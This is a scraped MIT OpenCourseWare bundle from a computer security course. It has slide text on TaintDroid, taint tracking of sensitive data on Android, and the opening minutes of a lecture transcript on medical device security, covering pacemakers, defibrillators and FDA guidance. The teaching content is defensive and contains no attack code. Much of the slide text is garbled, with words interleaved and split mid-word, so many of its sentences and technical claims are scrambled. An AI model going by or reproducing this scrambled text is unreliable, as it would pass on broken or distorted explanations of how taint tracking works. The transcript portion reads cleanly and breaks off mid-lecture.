A:	&#13; It's	&#13; too	&#13; expensive,	&#13; and	&#13; there	&#13; are	&#13; too	&#13; many	&#13; false	&#13; positives.	&#13;  	&#13; Why	&#13; not	&#13; track	&#13; taint	&#13; at	&#13; the	&#13; level	&#13; of 	&#13; x86	&#13; instructions	&#13; or	&#13; ARM	&#13; instructions?	&#13; 
Ex:
improperly	&#13; flow	&#13; 	&#13; If	&#13; kernel	&#13; data	&#13; structures	&#13; are 	&#13; improperly	&#13; assigned	&#13; taint,	&#13; then	&#13; 
impossible	&#13; to	&#13; tell	&#13; which	&#13; state	&#13; to	&#13; user-mode	&#13; processes.	&#13; This
has	&#13; *truly*	&#13; been	&#13; a	&#13; resuth
ffectlts	&#13; in	&#13; 
 ed	&#13; btae	&#13; taint	&#13; will 	&#13; 
	&#13; 
y	&#13; sensitint	&#13; exp
ive	&#13; losion
data:	&#13; 
.	&#13; it's	&#13; 
 One	&#13; way	&#13; that	&#13; this	&#13; might	&#13; happen	&#13; is	&#13; 
incorrectlif	&#13; the	&#13; stack	&#13; pointer	&#13; or	&#13; the	&#13; break 	&#13; pointer	&#13; are	&#13; 
Once
o 
o 	&#13; th
Locais	&#13; hy	&#13; t
appeainted. 	&#13; 
Stack	&#13; instrl	&#13; varians
b,	&#13; tai
le	&#13; ant	&#13; r
ccesses	&#13; apidly
a	&#13; 
reex
uctions	&#13; like	&#13; pop	&#13; 	&#13; 
usspplodes:	&#13; 
e	&#13; the	&#13; secified	&#13; 
tack	&#13; pointeras	&#13; offsets	&#13; from
.	&#13; 	&#13; the	&#13; break	&#13; pointer. 	&#13; 
4
4</text>
        </slide>
        <slide>
          <slideno>7</slideno>
          <text>MIT OpenCourseWare
http://ocw.mit.edu
6.858  Computer Systems Security
Fall 2014
For information about citing these materials or our Terms of Use, visit: http://ocw.mit.edu/terms.</text>
        </slide>
        <slide>
          <slideno>0</slideno>
          <text>6.858	&#13; Lecture	&#13; 21 	&#13; 
What	&#13; problem	&#13; does	&#13; the	&#13; paper	&#13; try	&#13; to	&#13; solve?	&#13; TAINT	&#13; TRACKING 	&#13; 
 
 Applications	&#13; can	&#13; exfiltrate	&#13; a	&#13; user's	&#13; private	&#13; data	&#13; and	&#13; send	&#13; it	&#13; to	&#13; some	&#13; server.	&#13; 
 Hig
leavh
i-
ng	&#13; thlevel	&#13; appr
e	&#13; devio
cac
e!	&#13; h:	&#13; keep	&#13; track	&#13; of	&#13; which	&#13; data	&#13; is	&#13; sensitive,	&#13; and	&#13; prevent	&#13; it	&#13; from 	&#13; 
Why	&#13; aren't	&#13; Android	&#13; permissions	&#13; enough?	&#13; 
o 
o Android	&#13; permissions	&#13; control	&#13; whether
access	&#13; devices	&#13; or	&#13; resources	&#13; (e.g., 	&#13; the	&#13; Inte	&#13; appli
rnecation	&#13; can	&#13; read/write	&#13; data,	&#13; or 	&#13; 
Using	&#13; Android	&#13; permissions,	&#13; it's	&#13; hard	&#13; types	&#13; of	&#13; data	&#13; (Ex:	&#13;  "Even	&#13; if	&#13; the	&#13; app 	&#13; has	&#13; ato	&#13; s
ccess	&#13; tpecit)
fy.	&#13; 
o	&#13; t	&#13; a	&#13; po
he	&#13; netlicy
w	&#13; abo
orkut	&#13; *par
,	&#13; it	&#13; shoultic
dular
never	&#13; be	&#13; able	&#13; to	&#13; send	&#13; user	&#13; data	&#13; over 	&#13; the	&#13; network"). 	&#13; 	&#13; *	&#13; 
 Q:	&#13; Aha!	&#13; What	&#13; if	&#13; we	&#13; never	&#13; install	&#13; apps	&#13; 	&#13; 
 access?	&#13; that	&#13; both	&#13; read	&#13; data	&#13; *and*	&#13; have	&#13; network 	&#13; 
A:	&#13; This	&#13; would	&#13; prevent	&#13; some	&#13; obvious	&#13; leaks,	&#13; 
legitimate	&#13; apps!	&#13; [Ex:	&#13; email	&#13; app]	&#13; but	&#13; it	&#13; would	&#13; also	&#13; brea k	&#13; many	&#13; 
 Information	&#13; can	&#13; still	&#13; leak	&#13; via	&#13; side	&#13; 	&#13; 
object	&#13; has	&#13; been	&#13; fetched	&#13; in	&#13; the	&#13; pastchannel
]	&#13; s.	&#13; [Ex:	&#13; browser	&#13; cache	&#13; leaks 	&#13; whether	&#13; an	&#13; 
 Apps	&#13; can	&#13; collude!	&#13; [Ex:	&#13; An	&#13; app	&#13; without	&#13; 	&#13; 
	&#13; 
 app	&#13; that	&#13; does	&#13; have 	&#13; network 	&#13; privileges.]networ
	&#13; k	&#13; privileges	&#13; can	&#13; pass	&#13; data	&#13; to	&#13; an	&#13; 
A	&#13; malicious	&#13; app	&#13; might	&#13; trick	&#13; another	&#13; 
to	&#13; the	&#13; Gmail	&#13; app?]	&#13; app	&#13; into	&#13; sending	&#13; data.	&#13; [Ex:	&#13; Sending 	&#13; an	&#13; intent	&#13; 
	&#13; 	&#13; 
What	&#13; does	&#13; Android	&#13; malware	&#13; actually	&#13; do?	&#13; 
 
  Use	&#13; location	&#13; or	&#13; IMEI	&#13; for	&#13; advertisements.	&#13; 
Turn	&#13; your	&#13; phone	&#13; intCredential	&#13; stealing:	&#13; sen
o	&#13; a	&#13; bd	&#13; 
otyou
,	&#13; use	&#13; your	&#13; contr	&#13; contact	&#13; list[IMEI	&#13; is	&#13; a	&#13; unique	&#13; per
,-device	&#13; identifier.] 	&#13; 
 messages!	&#13; a	&#13; IMEI,	&#13; phone	&#13; number	&#13; to	&#13; remote	&#13; server.	&#13; 
ct	&#13; list	&#13; to	&#13; send	&#13; spam	&#13; emails/SMS	&#13; 
 	&#13; Ref:	&#13; http://www.bbc.com/news/technology-30143283	&#13; 
Prevent
keep	&#13; your	&#13; device	&#13; from	&#13; getting	&#13; hacked!	&#13; ing	&#13; data	&#13; exfiltration	&#13; is	&#13; useful,	&#13;  but	&#13; taint	&#13; tracking	&#13; by	&#13; itself	&#13; is	&#13; insufficient	&#13; to 	&#13; 
	&#13; 	&#13; TaintDroid	&#13; tracks	&#13; sensitive	&#13; information	&#13; as	&#13; it	&#13; propagates	&#13; through	&#13; the	&#13; system.	&#13; 
 TaintDroid	&#13; distinguishes	&#13; between	&#13; information	&#13; sources	&#13; and	&#13; information	&#13; sinks	&#13; 
o 
o Sour
 ces	&#13; gener
Ex:	&#13; Sensate
or	&#13; 
ssensit
,	&#13; contactsive	&#13; da
,	&#13; IMEIta:	&#13; 
	&#13; 
Sinks	&#13; expose	&#13; sensitive	&#13; data: 	&#13; 
1
1</text>
        </slide>
        <slide>
          <slideno>2</slideno>
          <text>IPC
tai
 nt	&#13; th	&#13; messages	&#13; are	&#13; like	&#13; treated	&#13; like	&#13; arrays:	&#13; each	&#13; mess
at	&#13; is	&#13; the	&#13; union 	&#13; of	&#13; the	&#13; taints	&#13; of	&#13; the	&#13; constituentage
	&#13; par	&#13; i
tss	&#13; as
.	&#13; sociated 	&#13; with	&#13; a	&#13; single	&#13; 
Data	&#13; which	&#13; is	&#13; extracted	&#13; from	&#13; an	&#13; incoming	&#13; message	&#13; is	&#13; assigned	&#13; 
message.	&#13; the	&#13; taint	&#13; of	&#13; that	&#13; 
Each	&#13; file	&#13; is
o Like	&#13; with	&#13; arrays	&#13; and	&#13; IPC	&#13; associated	&#13; with	&#13; a	&#13; single	&#13; 
	&#13; messages,	&#13; this	&#13; is	&#13; a	&#13; conservative	&#13; scheme	&#13; that	&#13; taint	&#13; flag	&#13; that	&#13; is	&#13; stored	&#13; in	&#13; the 	&#13; file's	&#13; metadata.	&#13; 
	&#13; 	&#13; may	&#13; lead	&#13; to	&#13; false	&#13; positives.	&#13; 
H
 ow	&#13; are	&#13; taint	&#13; flags	&#13; represented	&#13; in	&#13; memory?	&#13; 
Five	&#13; 
1) 
 kinds	&#13; of	&#13; things	&#13; need	&#13; to	&#13; have	&#13; taint 	&#13; tags: 	&#13; 
2)
4)3)
5) Local	&#13; variables	&#13; in	&#13; a	&#13; method	&#13; --
 Method	&#13; arguments	&#13; 	&#13; 	&#13; 	&#13; 	&#13; 	&#13; 	&#13; 	&#13; 	&#13; 	&#13; 	&#13; 	&#13; +___	&#13; live	&#13; on	&#13; stack__	&#13; 
Obje
Static	&#13; class	&#13; fieldsct	&#13; instance	&#13; fi
	&#13; elds	&#13; 	&#13; 	&#13; 	&#13; 	&#13; 	&#13; --+	&#13; 
 
 Arrays	&#13; 
 BasQ:
A:	&#13; Preserves	&#13; spatial	&#13; locality---	&#13; Wh 
ic	&#13; i
y?de
	&#13; a:	&#13; Store	&#13; the	&#13; flags	&#13; for	&#13; a	&#13; variable 	&#13; near	&#13; the	&#13; variable	&#13; itself.	&#13; 
	&#13; 
 this	&#13; hopefully	&#13; improves	&#13; caching	&#13; behavior.	&#13; 
For	&#13; method	&#13; arguments	&#13; and	&#13; local	&#13; variables	&#13; 
taint	&#13; flags	&#13; immediately	&#13; next	&#13; to	&#13; the	&#13; 
    . 
    . variable.th
	&#13; at	&#13; live	&#13; on	&#13; the	&#13; stack,	&#13; allocate	&#13; the 	&#13; 
|        .         | 
+------------------+ 
|     local0       | 
+------------------+ | local0 taint tag | 
+------------------+ 
|     local1       | +------------------+ 
| local1 taint tag | 
+------------------+ 
    . 
	&#13;     .     . 
 TaintDroid	&#13; uses	&#13; a	&#13; similar	&#13; approach	&#13; 
the	&#13; taint	&#13; tag	&#13; next	&#13; to	&#13; the	&#13; associated	&#13; data.for	&#13; cl
	&#13; ass	&#13; fields,	&#13; object	&#13; fields, 	&#13; and	&#13; arrays---put	&#13; 
So,	&#13; given	&#13; all	&#13; of	&#13; this,	&#13; the	&#13; 	&#13; 
basic	&#13; idea	&#13; in 	&#13; TaintDroid	&#13; is	&#13; simple:	&#13; taint	&#13; sensitive	&#13; data	&#13; 
networflows	&#13; through	&#13; the	&#13; system,	&#13; and	&#13; raise	&#13; an	&#13; alarm	&#13; if	&#13; that	&#13; data	&#13; tries	&#13; to	&#13; leave	&#13; via	&#13; as	&#13; it	&#13; 
 The	&#13; ak!	&#13; the	&#13; 
uthors	&#13; find	&#13; various	&#13; ways	&#13; that	&#13; apps	&#13; misbehave.	&#13; Ex:	&#13; 
3
3</text>
        </slide>
      </slides>
      <videos>
        <video>
          <video_url>https://ocw.mit.edu/courses/6-858-computer-systems-security-fall-2014/resources/lecture-15-medical-software/</video_url>
          <video_title>Lecture 15: Medical Software</video_title>
          <transcript>
            <slice>
              <time_slice>0:00</time_slice>
              <text_slice>The following content is
provided under a Creative</text_slice>
            </slice>
            <slice>
              <time_slice>0:02</time_slice>
              <text_slice>Commons license.</text_slice>
            </slice>
            <slice>
              <time_slice>0:03</time_slice>
              <text_slice>Your support will help
MIT OpenCourseWare</text_slice>
            </slice>
            <slice>
              <time_slice>0:06</time_slice>
              <text_slice>continue to offer high quality
educational resources for free.</text_slice>
            </slice>
            <slice>
              <time_slice>0:10</time_slice>
              <text_slice>To make a donation, or to
view additional materials</text_slice>
            </slice>
            <slice>
              <time_slice>0:12</time_slice>
              <text_slice>from hundreds of MIT courses,
visit MIT OpenCourseWare</text_slice>
            </slice>
            <slice>
              <time_slice>0:16</time_slice>
              <text_slice>at ocw.mit.edu.</text_slice>
            </slice>
            <slice>
              <time_slice>0:31</time_slice>
              <text_slice>PROFESSOR: So welcome
everybody, and I actually</text_slice>
            </slice>
            <slice>
              <time_slice>0:36</time_slice>
              <text_slice>used to be at MIT in the
'90s, so it's good to be back.</text_slice>
            </slice>
            <slice>
              <time_slice>0:38</time_slice>
              <text_slice>And so we're going to talk
today about a different kind</text_slice>
            </slice>
            <slice>
              <time_slice>0:41</time_slice>
              <text_slice>of security.</text_slice>
            </slice>
            <slice>
              <time_slice>0:42</time_slice>
              <text_slice>It's going to be less on the
technical mechanism side,</text_slice>
            </slice>
            <slice>
              <time_slice>0:44</time_slice>
              <text_slice>and more on the,
well, what happens</text_slice>
            </slice>
            <slice>
              <time_slice>0:46</time_slice>
              <text_slice>when all this technology gets
put in place in something</text_slice>
            </slice>
            <slice>
              <time_slice>0:48</time_slice>
              <text_slice>where there's high consequences?</text_slice>
            </slice>
            <slice>
              <time_slice>0:49</time_slice>
              <text_slice>Not quite so high-consequence
as, say, an airplane in</text_slice>
            </slice>
            <slice>
              <time_slice>0:52</time_slice>
              <text_slice>the sky, but getting
pretty close.</text_slice>
            </slice>
            <slice>
              <time_slice>0:55</time_slice>
              <text_slice>Just to let you know
where I'm coming from.</text_slice>
            </slice>
            <slice>
              <time_slice>0:57</time_slice>
              <text_slice>So I used to be part of the
midnight coffeehouse club</text_slice>
            </slice>
            <slice>
              <time_slice>0:59</time_slice>
              <text_slice>myself, but this is
Michigan, actually.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02</time_slice>
              <text_slice>We're not quite as big
as your campus here.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04</time_slice>
              <text_slice>But a short while
ago somebody decided</text_slice>
            </slice>
            <slice>
              <time_slice>1:06</time_slice>
              <text_slice>to put a hot tub on our
computer science building,</text_slice>
            </slice>
            <slice>
              <time_slice>1:09</time_slice>
              <text_slice>so they're doing
research inside there.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11</time_slice>
              <text_slice>But what we're going
to talk about today</text_slice>
            </slice>
            <slice>
              <time_slice>1:13</time_slice>
              <text_slice>is some of the research
that bubbled out of that.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16</time_slice>
              <text_slice>So we're going to
talk about everything</text_slice>
            </slice>
            <slice>
              <time_slice>1:17</time_slice>
              <text_slice>from exploding defibrillators
to other issues of privacy</text_slice>
            </slice>
            <slice>
              <time_slice>1:23</time_slice>
              <text_slice>in medical devices.</text_slice>
            </slice>
            <slice>
              <time_slice>1:24</time_slice>
              <text_slice>And this mainly is
going to be related</text_slice>
            </slice>
            <slice>
              <time_slice>1:26</time_slice>
              <text_slice>to just one thread of research
from one of my former graduate</text_slice>
            </slice>
            <slice>
              <time_slice>1:29</time_slice>
              <text_slice>students here, who is
actually at this point</text_slice>
            </slice>
            <slice>
              <time_slice>1:32</time_slice>
              <text_slice>sanitizing explanted pacemakers.</text_slice>
            </slice>
            <slice>
              <time_slice>1:36</time_slice>
              <text_slice>But we're going to mostly
talk about the security</text_slice>
            </slice>
            <slice>
              <time_slice>1:38</time_slice>
              <text_slice>of medical devices today.</text_slice>
            </slice>
            <slice>
              <time_slice>1:41</time_slice>
              <text_slice>Got a bunch of acknowledgements.</text_slice>
            </slice>
            <slice>
              <time_slice>1:43</time_slice>
              <text_slice>There it is on tape.</text_slice>
            </slice>
            <slice>
              <time_slice>1:47</time_slice>
              <text_slice>This work is by tons
of people, and I'm</text_slice>
            </slice>
            <slice>
              <time_slice>1:49</time_slice>
              <text_slice>going to try to
summarize for you some</text_slice>
            </slice>
            <slice>
              <time_slice>1:51</time_slice>
              <text_slice>of the modern bits about
medical device security</text_slice>
            </slice>
            <slice>
              <time_slice>1:54</time_slice>
              <text_slice>through all sorts of places.</text_slice>
            </slice>
            <slice>
              <time_slice>1:56</time_slice>
              <text_slice>I'm also required to
put up this boilerplate</text_slice>
            </slice>
            <slice>
              <time_slice>1:58</time_slice>
              <text_slice>slide of my potential
conflict of interest,</text_slice>
            </slice>
            <slice>
              <time_slice>2:01</time_slice>
              <text_slice>so now you can know about
any potential biases</text_slice>
            </slice>
            <slice>
              <time_slice>2:03</time_slice>
              <text_slice>on my thinking.</text_slice>
            </slice>
            <slice>
              <time_slice>2:05</time_slice>
              <text_slice>But I'd like to
think that I am less</text_slice>
            </slice>
            <slice>
              <time_slice>2:06</time_slice>
              <text_slice>biased than the average person.</text_slice>
            </slice>
            <slice>
              <time_slice>2:08</time_slice>
              <text_slice>OK.</text_slice>
            </slice>
            <slice>
              <time_slice>2:11</time_slice>
              <text_slice>So moving on.</text_slice>
            </slice>
            <slice>
              <time_slice>2:12</time_slice>
              <text_slice>So an interesting thing
happened about a year ago,</text_slice>
            </slice>
            <slice>
              <time_slice>2:15</time_slice>
              <text_slice>when FDA-- the Food and
Drug Administration--</text_slice>
            </slice>
            <slice>
              <time_slice>2:17</time_slice>
              <text_slice>released a draft document
saying they are now</text_slice>
            </slice>
            <slice>
              <time_slice>2:19</time_slice>
              <text_slice>going to be expecting
manufacturers to consider cyber</text_slice>
            </slice>
            <slice>
              <time_slice>2:22</time_slice>
              <text_slice>security-- or as we call
it, security and privacy--</text_slice>
            </slice>
            <slice>
              <time_slice>2:24</time_slice>
              <text_slice>not only in their implementation
of the medical device software,</text_slice>
            </slice>
            <slice>
              <time_slice>2:27</time_slice>
              <text_slice>but in their design
of their software.</text_slice>
            </slice>
            <slice>
              <time_slice>2:29</time_slice>
              <text_slice>Before a single line of
code has been written.</text_slice>
            </slice>
            <slice>
              <time_slice>2:31</time_slice>
              <text_slice>And so we're going
to talk about how</text_slice>
            </slice>
            <slice>
              <time_slice>2:33</time_slice>
              <text_slice>this has affected the
thinking in the medical device</text_slice>
            </slice>
            <slice>
              <time_slice>2:35</time_slice>
              <text_slice>manufacturing community.</text_slice>
            </slice>
            <slice>
              <time_slice>2:37</time_slice>
              <text_slice>Their final guidance came
out just a couple weeks ago,</text_slice>
            </slice>
            <slice>
              <time_slice>2:40</time_slice>
              <text_slice>and we just held
a conference call.</text_slice>
            </slice>
            <slice>
              <time_slice>2:42</time_slice>
              <text_slice>FDA held a conference
call, and over 650 people</text_slice>
            </slice>
            <slice>
              <time_slice>2:44</time_slice>
              <text_slice>decided to join
the teleconference.</text_slice>
            </slice>
            <slice>
              <time_slice>2:46</time_slice>
              <text_slice>So there's a lot of interest
in the manufacturing community</text_slice>
            </slice>
            <slice>
              <time_slice>2:49</time_slice>
              <text_slice>about how to take some of the
concepts you're learning here</text_slice>
            </slice>
            <slice>
              <time_slice>2:51</time_slice>
              <text_slice>in your class and actually apply
it to the medical community.</text_slice>
            </slice>
            <slice>
              <time_slice>2:54</time_slice>
              <text_slice>But it's really hard.</text_slice>
            </slice>
            <slice>
              <time_slice>2:55</time_slice>
              <text_slice>And I noticed one of the
questions up on the website</text_slice>
            </slice>
            <slice>
              <time_slice>2:58</time_slice>
              <text_slice>was about how to get the culture
change in the medical community</text_slice>
            </slice>
            <slice>
              <time_slice>3:01</time_slice>
              <text_slice>to understand security.</text_slice>
            </slice>
            <slice>
              <time_slice>3:03</time_slice>
              <text_slice>And this slide illustrates that.</text_slice>
            </slice>
            <slice>
              <time_slice>3:05</time_slice>
              <text_slice>So, who washed their
hands this morning?</text_slice>
            </slice>
            <slice>
              <time_slice>3:08</time_slice>
              <text_slice>OK.</text_slice>
            </slice>
            <slice>
              <time_slice>3:08</time_slice>
              <text_slice>Oh, this is not MIT, everybody.</text_slice>
            </slice>
            <slice>
              <time_slice>3:11</time_slice>
              <text_slice>So actually about
164, 165 years ago,</text_slice>
            </slice>
            <slice>
              <time_slice>3:15</time_slice>
              <text_slice>there was a famous
physician, Ignaz Semmelweis,</text_slice>
            </slice>
            <slice>
              <time_slice>3:18</time_slice>
              <text_slice>who was looking into something
called childbed fever.</text_slice>
            </slice>
            <slice>
              <time_slice>3:21</time_slice>
              <text_slice>And he discovered that
his medical students</text_slice>
            </slice>
            <slice>
              <time_slice>3:23</time_slice>
              <text_slice>who were working in the morgue
in the morning who later went</text_slice>
            </slice>
            <slice>
              <time_slice>3:26</time_slice>
              <text_slice>to work with patients,
well, those patients</text_slice>
            </slice>
            <slice>
              <time_slice>3:27</time_slice>
              <text_slice>tended to die more often.</text_slice>
            </slice>
            <slice>
              <time_slice>3:29</time_slice>
              <text_slice>And he discovered if you washed
your hands, then statistically</text_slice>
            </slice>
            <slice>
              <time_slice>3:32</time_slice>
              <text_slice>you were less likely to pass
on some kind of probability</text_slice>
            </slice>
            <slice>
              <time_slice>3:35</time_slice>
              <text_slice>of not living longer.</text_slice>
            </slice>
            <slice>
              <time_slice>3:38</time_slice>
              <text_slice>So he recommended that
physicians wash their hands.</text_slice>
            </slice>
            <slice>
              <time_slice>3:41</time_slice>
              <text_slice>And the reaction from
the physician community</text_slice>
            </slice>
            <slice>
              <time_slice>3:43</time_slice>
              <text_slice>was, doctors are
gentleman, and therefore</text_slice>
            </slice>
            <slice>
              <time_slice>3:45</time_slice>
              <text_slice>their hands are always clean.</text_slice>
            </slice>
            <slice>
              <time_slice>3:48</time_slice>
              <text_slice>And to some extent
we're seeing some</text_slice>
            </slice>
            <slice>
              <time_slice>3:50</time_slice>
              <text_slice>of those kinds of attitudes
toward security today,</text_slice>
            </slice>
            <slice>
              <time_slice>3:52</time_slice>
              <text_slice>so it's not too surprising.</text_slice>
            </slice>
            <slice>
              <time_slice>3:53</time_slice>
              <text_slice>But I'll try to
draw some parallels</text_slice>
            </slice>
            <slice>
              <time_slice>3:55</time_slice>
              <text_slice>with that throughout the talk.</text_slice>
            </slice>
            <slice>
              <time_slice>3:59</time_slice>
              <text_slice>I've got a lot of
material to cover</text_slice>
            </slice>
            <slice>
              <time_slice>4:00</time_slice>
              <text_slice>so I'm going to whip
through some things.</text_slice>
            </slice>
            <slice>
              <time_slice>4:02</time_slice>
              <text_slice>But first thing I'm going
to do-- anyone a physician?</text_slice>
            </slice>
            <slice>
              <time_slice>4:04</time_slice>
              <text_slice>No?</text_slice>
            </slice>
            <slice>
              <time_slice>4:05</time_slice>
              <text_slice>OK, well you're all
going to be able to have</text_slice>
            </slice>
            <slice>
              <time_slice>4:07</time_slice>
              <text_slice>some good material
for cocktail parties</text_slice>
            </slice>
            <slice>
              <time_slice>4:08</time_slice>
              <text_slice>with your doctor friends.</text_slice>
            </slice>
            <slice>
              <time_slice>4:10</time_slice>
              <text_slice>We're going to talk
a little bit about</text_slice>
            </slice>
            <slice>
              <time_slice>4:11</time_slice>
              <text_slice>implantable medical devices.</text_slice>
            </slice>
            <slice>
              <time_slice>4:12</time_slice>
              <text_slice>Actually I'll pass
this guy around.</text_slice>
            </slice>
            <slice>
              <time_slice>4:14</time_slice>
              <text_slice>You can feel free to touch it.</text_slice>
            </slice>
            <slice>
              <time_slice>4:15</time_slice>
              <text_slice>It's been de-dangered.</text_slice>
            </slice>
            <slice>
              <time_slice>4:16</time_slice>
              <text_slice>Just don't lick it.</text_slice>
            </slice>
            <slice>
              <time_slice>4:17</time_slice>
              <text_slice>This is a defibrillator
from a former patient.</text_slice>
            </slice>
            <slice>
              <time_slice>4:21</time_slice>
              <text_slice>And actually this is a device
here-- about 50 years ago,</text_slice>
            </slice>
            <slice>
              <time_slice>4:25</time_slice>
              <text_slice>some of the first pacemakers
started to appear on the scene.</text_slice>
            </slice>
            <slice>
              <time_slice>4:27</time_slice>
              <text_slice>They were external.</text_slice>
            </slice>
            <slice>
              <time_slice>4:28</time_slice>
              <text_slice>You had to have a burly
nurse to cart it around.</text_slice>
            </slice>
            <slice>
              <time_slice>4:31</time_slice>
              <text_slice>And then as the
decades wore on, they</text_slice>
            </slice>
            <slice>
              <time_slice>4:34</time_slice>
              <text_slice>became small enough
to be implanted,</text_slice>
            </slice>
            <slice>
              <time_slice>4:36</time_slice>
              <text_slice>completely implanted
in the body.</text_slice>
            </slice>
            <slice>
              <time_slice>4:37</time_slice>
              <text_slice>And here you see a
picture of what's</text_slice>
            </slice>
            <slice>
              <time_slice>4:39</time_slice>
              <text_slice>called a wand that's
using inductive coupling.</text_slice>
            </slice>
            <slice>
              <time_slice>4:42</time_slice>
              <text_slice>It's technically wireless.</text_slice>
            </slice>
            <slice>
              <time_slice>4:43</time_slice>
              <text_slice>There are no wires.</text_slice>
            </slice>
            <slice>
              <time_slice>4:44</time_slice>
              <text_slice>To wirelessly program the device
to be 60 beats per minute.</text_slice>
            </slice>
            <slice>
              <time_slice>4:47</time_slice>
              <text_slice>But interesting to me
as a security researcher</text_slice>
            </slice>
            <slice>
              <time_slice>4:49</time_slice>
              <text_slice>was that in around
2003 or so, we</text_slice>
            </slice>
            <slice>
              <time_slice>4:51</time_slice>
              <text_slice>began to see defibrillators,
such as the one I'm</text_slice>
            </slice>
            <slice>
              <time_slice>4:53</time_slice>
              <text_slice>passing around, that started to
embrace wireless technologies</text_slice>
            </slice>
            <slice>
              <time_slice>4:58</time_slice>
              <text_slice>and networking that
you'd be more used to</text_slice>
            </slice>
            <slice>
              <time_slice>5:00</time_slice>
              <text_slice>as sort of general computation.</text_slice>
            </slice>
            <slice>
              <time_slice>5:03</time_slice>
              <text_slice>And I was thinking what
could possibly go wrong?</text_slice>
            </slice>
            <slice>
              <time_slice>5:06</time_slice>
              <text_slice>Luckily there are a lot
of engineers also thinking</text_slice>
            </slice>
            <slice>
              <time_slice>5:08</time_slice>
              <text_slice>that same question in
companies, but security, it</text_slice>
            </slice>
            <slice>
              <time_slice>5:12</time_slice>
              <text_slice>takes a different mindset.</text_slice>
            </slice>
            <slice>
              <time_slice>5:13</time_slice>
              <text_slice>And I'm going to tell you
a little bit about how</text_slice>
            </slice>
            <slice>
              <time_slice>5:15</time_slice>
              <text_slice>that mindset is changing.</text_slice>
            </slice>
            <slice>
              <time_slice>5:16</time_slice>
              <text_slice>So if you were to open up
one of those devices, what</text_slice>
            </slice>
            <slice>
              <time_slice>5:18</time_slice>
              <text_slice>you find inside are vast
resource constraints.</text_slice>
            </slice>
            <slice>
              <time_slice>5:21</time_slice>
              <text_slice>If you want a hard
engineering problem,</text_slice>
            </slice>
            <slice>
              <time_slice>5:23</time_slice>
              <text_slice>pop open one of these devices.</text_slice>
            </slice>
            <slice>
              <time_slice>5:25</time_slice>
              <text_slice>So about half of the
device is just a battery.</text_slice>
            </slice>
            <slice>
              <time_slice>5:28</time_slice>
              <text_slice>A very high quality battery.</text_slice>
            </slice>
            <slice>
              <time_slice>5:29</time_slice>
              <text_slice>These cost about $40,000
a pop on the market.</text_slice>
            </slice>
            <slice>
              <time_slice>5:33</time_slice>
              <text_slice>Silver vanadium oxide.</text_slice>
            </slice>
            <slice>
              <time_slice>5:34</time_slice>
              <text_slice>And you've got little
microcontrollers at the top.</text_slice>
            </slice>
            <slice>
              <time_slice>5:36</time_slice>
              <text_slice>Typically you have
some antennas where</text_slice>
            </slice>
            <slice>
              <time_slice>5:38</time_slice>
              <text_slice>you can do your communication
for your control of the device</text_slice>
            </slice>
            <slice>
              <time_slice>5:40</time_slice>
              <text_slice>as well.</text_slice>
            </slice>
            <slice>
              <time_slice>5:41</time_slice>
              <text_slice>This is all hermetically
sealed, implanted in your body.</text_slice>
            </slice>
            <slice>
              <time_slice>5:44</time_slice>
              <text_slice>We're talking one of the
harshest environments possible.</text_slice>
            </slice>
            <slice>
              <time_slice>5:47</time_slice>
              <text_slice>You want to recharge a battery
in your body, good luck.</text_slice>
            </slice>
            <slice>
              <time_slice>5:49</time_slice>
              <text_slice>Did you know that batteries
give off heat and gas?</text_slice>
            </slice>
            <slice>
              <time_slice>5:52</time_slice>
              <text_slice>So there are very
challenging constraints</text_slice>
            </slice>
            <slice>
              <time_slice>5:54</time_slice>
              <text_slice>to engineering the device.</text_slice>
            </slice>
            <slice>
              <time_slice>5:56</time_slice>
              <text_slice>When you want to add security,
it gets just a little bit hard.</text_slice>
            </slice>
            <slice>
              <time_slice>6:00</time_slice>
              <text_slice>So there is, however,
a very good reason</text_slice>
            </slice>
            <slice>
              <time_slice>6:02</time_slice>
              <text_slice>for having a wirelessly
controlled medical device.</text_slice>
            </slice>
            <slice>
              <time_slice>6:06</time_slice>
              <text_slice>There are good reasons, but
there are these subtle risks.</text_slice>
            </slice>
            <slice>
              <time_slice>6:08</time_slice>
              <text_slice>So to illustrate
that, I want you</text_slice>
            </slice>
            <slice>
              <time_slice>6:10</time_slice>
              <text_slice>to see what pacemakers
used to look like.</text_slice>
            </slice>
            <slice>
              <time_slice>6:13</time_slice>
              <text_slice>So this is a pacemaker
from the Medtronic Museum</text_slice>
            </slice>
            <slice>
              <time_slice>6:15</time_slice>
              <text_slice>up in Minneapolis.</text_slice>
            </slice>
            <slice>
              <time_slice>6:17</time_slice>
              <text_slice>And can anyone guess what
that little piece of metal</text_slice>
            </slice>
            <slice>
              <time_slice>6:19</time_slice>
              <text_slice>is on the right hand side?</text_slice>
            </slice>
            <slice>
              <time_slice>6:21</time_slice>
              <text_slice>What its function is?</text_slice>
            </slice>
            <slice>
              <time_slice>6:24</time_slice>
              <text_slice>Antenna?</text_slice>
            </slice>
            <slice>
              <time_slice>6:25</time_slice>
              <text_slice>Control?</text_slice>
            </slice>
            <slice>
              <time_slice>6:26</time_slice>
              <text_slice>Control is very close.</text_slice>
            </slice>
            <slice>
              <time_slice>6:27</time_slice>
              <text_slice>Any other guesses?</text_slice>
            </slice>
            <slice>
              <time_slice>6:31</time_slice>
              <text_slice>So this is a device before
there was wireless communication</text_slice>
            </slice>
            <slice>
              <time_slice>6:34</time_slice>
              <text_slice>to control a pacemaker.</text_slice>
            </slice>
            <slice>
              <time_slice>6:35</time_slice>
              <text_slice>In the old days, when you
want to change the settings</text_slice>
            </slice>
            <slice>
              <time_slice>6:37</time_slice>
              <text_slice>on your device, the
physician says, "Patient,</text_slice>
            </slice>
            <slice>
              <time_slice>6:40</time_slice>
              <text_slice>please lift up your arm.</text_slice>
            </slice>
            <slice>
              <time_slice>6:41</time_slice>
              <text_slice>I'm going to put a needle
through your armpit to twist</text_slice>
            </slice>
            <slice>
              <time_slice>6:43</time_slice>
              <text_slice>the dial to change
your heart rate. "</text_slice>
            </slice>
            <slice>
              <time_slice>6:45</time_slice>
              <text_slice>So one of the great
reasons for wireless</text_slice>
            </slice>
            <slice>
              <time_slice>6:48</time_slice>
              <text_slice>is that it actually
reduces infection rates,</text_slice>
            </slice>
            <slice>
              <time_slice>6:50</time_slice>
              <text_slice>because the more you put
foreign objects in your body,</text_slice>
            </slice>
            <slice>
              <time_slice>6:53</time_slice>
              <text_slice>the more likely you are
to contract an infection.</text_slice>
            </slice>
            <slice>
              <time_slice>6:56</time_slice>
